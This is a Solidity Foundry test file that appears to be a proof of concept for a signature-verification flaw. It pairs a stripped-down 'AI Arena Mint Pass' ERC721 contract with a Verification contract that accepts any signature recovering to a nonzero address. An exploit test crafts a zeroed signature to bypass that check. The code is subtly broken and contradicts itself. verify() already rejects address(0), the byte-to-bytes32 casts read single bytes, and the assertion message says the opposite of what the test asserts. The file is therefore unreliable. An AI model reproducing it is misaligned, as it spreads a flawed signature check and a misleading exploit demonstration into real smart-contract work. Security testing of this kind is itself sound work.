// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol";

interface IVerification {
    function verify(bytes32 hash, bytes memory signature) external view returns (bool);
}

contract AAMintPass is ERC721, ERC721Burnable {
    address public founderAddress;
    address public fighterFarmContractAddress;
    address public delegatedAddress;
    mapping(address => bool) public isAdmin;
    mapping(uint256 => string) private tokenURIs;
    mapping(address => mapping(uint8 => uint8)) public passesClaimed;
    bool public mintingPaused = true;
    uint256 public numTokensOutstanding = 0;
    uint256 public numTokensBurned = 0;

    constructor(address _founderAddress, address _delegatedAddress) 
        ERC721("AI Arena Mint Pass", "AAMP") 
    {
        delegatedAddress = _delegatedAddress;
        founderAddress = _founderAddress;
        isAdmin[founderAddress] = true;
    }

    function transferOwnership(address _newFounderAddress) external {
        require(msg.sender == founderAddress);
        isAdmin[founderAddress] = false;
        founderAddress = _newFounderAddress;
        isAdmin[_newFounderAddress] = true;
    }

    function addAdmin(address _newAdmin) external {
        require(msg.sender == founderAddress);
        isAdmin[_newAdmin] = true;
    }
}

contract Verification {
    function verify(bytes32 hash, bytes memory signature) external pure returns (bool) {
        address signer = ecrecover(hash, uint8(signature[64]), bytes32(signature[0]), bytes32(signature[32]));
        return signer != address(0);
    }
}

contract ExploitTest is Test {
    AAMintPass mintPass;
    Verification verification;
    address attacker = address(0xBEEF);
    address founder = address(0xF00D);
    address delegated = address(0xDEAD);

    function setUp() public {
        // Deploy contracts
        verification = new Verification();
        mintPass = new AAMintPass(founder, delegated);

        // Fund attacker
        vm.deal(attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Craft a signature that results in ecrecover returning address(0)
        bytes32 hash = keccak256(abi.encodePacked("Invalid Signature"));
        bytes memory signature = new bytes(65);
        signature[64] = bytes1(uint8(27)); // v value

        // Step 2: Impersonate attacker and call verify with crafted signature
        vm.prank(attacker);
        bool result = verification.verify(hash, signature);

        // Assert the vulnerability: verify should return false, but due to unchecked ecrecover, it returns true
        assertTrue(result, "Verification should not succeed with invalid signature");
    }
}